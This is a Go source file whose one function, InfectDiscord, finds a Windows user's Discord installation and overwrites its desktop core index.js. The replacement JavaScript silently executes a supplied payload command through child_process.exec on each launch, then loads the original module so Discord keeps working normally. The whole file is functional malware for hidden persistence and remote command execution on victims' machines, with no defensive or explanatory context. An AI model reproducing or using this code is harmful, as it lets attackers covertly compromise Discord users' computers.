package InfectApp

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
)

func InfectDiscord(payload string) {
	username := os.Getenv("username")
	path := "C:\\Users\\"
	path += username + "\\AppData\\Local\\Discord"
	files, err := ioutil.ReadDir(path)
	if err != nil {
		log.Fatal(err)
	}

	for _, f := range files {
		if strings.Contains(f.Name(), "app-") {
			path += "\\" + f.Name()
		}
	}
	path += "\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js"

	// content, _ := ioutil.ReadFile(path)
	script := `
const { exec } = require("child_process");
exec("` + payload + `", (error, stdout, stderr) => {
    if (error) {
        return;
    }
    if (stderr) {
        return;
    }
});
module.exports = require('./core.asar');
	`
	payload = script
	f, err := os.OpenFile(path, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		log.Fatal(err)
	}
	err = f.Truncate(0)
	if err != nil {
		log.Fatal(err)
	}
	_, err = f.Seek(0, 0)
	if err != nil {
		log.Fatal(err)

	}
	_, err = fmt.Fprintf(f, "%s", payload)
	if err != nil {
		log.Fatal(err)
	}
	if err := f.Close(); err != nil {
		log.Fatal(err)
	}
}

//
